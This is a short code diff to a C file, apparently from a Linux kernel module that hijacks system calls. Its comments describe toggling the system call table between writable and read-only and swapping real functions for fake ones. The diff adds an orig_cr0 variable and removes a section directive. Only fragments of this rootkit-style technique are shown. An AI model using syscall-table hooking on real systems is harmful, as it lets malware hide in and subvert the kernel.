@@ -1,5 +1,7 @@
 #include "hookfns.h"
 
+static unsigned long orig_cr0;
+
 /*****************************************************************************\
 | Methods to get/set the system call table to RW or RO                         |
 \*****************************************************************************/
@@ -72,8 +74,6 @@ int set_sct_ro(void){
 | The macros HOOK and HOOK_IA32 replace the REAL functions with the FAKE      |
 | ones. See syshijack.h for more info.                                        |
 \*****************************************************************************/
-
-asm(".section .counters, \"aw\""); //set section allocatable and writable
 
 void hook_calls(void){
 
